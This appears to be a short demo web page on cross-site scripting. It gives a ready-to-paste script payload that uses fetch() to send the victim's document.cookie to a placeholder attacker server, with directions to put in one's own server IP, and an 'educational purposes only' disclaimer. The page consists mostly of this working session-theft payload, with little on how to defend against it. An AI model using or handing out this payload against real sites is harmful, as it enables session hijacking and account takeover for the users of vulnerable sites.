XSS Cookie Theft Example

This page sets a cookie and demonstrates how an attacker can steal it via an XSS vulnerability.

Test the XSS Attack:

Enter the following payload into the input field or use the URL to test:

<script>fetch('http://YOUR-SERVER-IP:3000/steal?cookie=' + document.cookie)</script>

Replace YOUR-SERVER-IP with the IP address of your Node.js server.

⚠️ This is for **educational purposes only**. Do not use it on live or unauthorized systems!
